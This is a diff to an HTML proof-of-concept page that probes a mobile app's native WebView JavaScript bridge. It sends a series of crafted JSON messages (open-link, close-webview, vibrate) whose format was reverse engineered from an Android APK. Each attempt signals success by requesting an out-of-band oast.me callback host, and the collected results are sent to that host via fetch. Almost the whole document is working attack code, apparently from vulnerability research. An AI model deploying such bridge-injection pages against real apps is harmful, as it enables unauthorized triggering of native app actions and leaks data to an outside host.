@@ -1,24 +1,59 @@
 <html><head><title>PoC</title></head>
 <body>
 <script>
-// Send OPEN_URL message to native via the bridge
-// From Android code: d4 class has @SerialName("OPEN_URL")
-// Let's try various payload formats
+// Correct message format based on APK reverse engineering:
+// SerialName = "OPEN_LINK" (not "OPEN_URL")
+// urlType = "DEEPLINK" or "WEBLINK"
+// openType = "IN" or "OUT"
+// needAuth = boolean
+//
+// The bt0/m.java transformDeserialize expects:
+// {"type":"OPEN_LINK","trackId":"...","payload":{"url":"...","urlType":"...","openType":"...","needAuth":false}}
+//
+// Also trying the internal/flat format in case iOS doesn't transform
 
-var attempts = [
-  '{"type":"OPEN_URL","trackId":"test1","payload":{"url":"https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/openurl-worked"}}',
-  '{"type":"OPEN_URL","trackId":"test2","url":"https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/openurl2-worked"}',
-  '{"type":"OPEN_URL","payload":{"url":"https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/openurl3-worked"}}',
-  '{"type":"OPEN_URL","url":"https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/openurl4-worked"}',
+var messages = [
+  // Format 1: with payload wrapper (matches transformSerialize output)
+  '{"type":"OPEN_LINK","trackId":"t1","payload":{"url":"https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/open1","urlType":"WEBLINK","openType":"OUT","needAuth":false}}',
+
+  // Format 2: flat (matches internal dtoMessageType format)
+  '{"dtoMessageType":"OPEN_LINK","trackId":"t2","url":"https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/open2","urlType":"WEBLINK","openType":"OUT","needAuth":false}',
+
+  // Format 3: type at top level with fields flat (no payload wrapper)
+  '{"type":"OPEN_LINK","trackId":"t3","url":"https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/open3","urlType":"WEBLINK","openType":"OUT","needAuth":false}',
+
+  // Format 4: DEEPLINK urlType + IN openType
+  '{"type":"OPEN_LINK","trackId":"t4","payload":{"url":"https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/open4","urlType":"DEEPLINK","openType":"IN","needAuth":false}}',
+
+  // Format 5: try READY first then OPEN_LINK
+  '{"type":"READY","trackId":"r1"}',
+
+  // Format 6: CLOSE_CURRENT_WEBVIEW (simpler message, might prove processing)
+  '{"type":"CLOSE_CURRENT_WEBVIEW","trackId":"c1"}',
+
+  // Format 7: NATIVE_VIBRATE_REQUEST (physical proof!)
+  '{"type":"NATIVE_VIBRATE_REQUEST","trackId":"v1","payload":{"type":"LIGHT"}}',
+
+  // Format 8: try without trackId
+  '{"type":"OPEN_LINK","payload":{"url":"https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/open8","urlType":"WEBLINK","openType":"OUT","needAuth":false}}',
 ];
 
-attempts.forEach(function(msg, i) {
+var results = [];
+messages.forEach(function(msg, i) {
   setTimeout(function(){
-    window.__plusSDKMobileCompat.onMessage(msg);
-  }, i * 500);
+    try {
+      window.__plusSDKMobileCompat.onMessage(msg);
+      results.push(i + ":sent");
+    } catch(e) {
+      results.push(i + ":err:" + e.message);
+    }
+    if (i === messages.length - 1) {
+      setTimeout(function(){
+        fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/all-sent?" + encodeURIComponent(JSON.stringify(results)));
+      }, 1000);
+    }
+  }, i * 300);
 });
-
-fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/open-url-sent?count=" + attempts.length);
 </script>
 </body>
 </html>
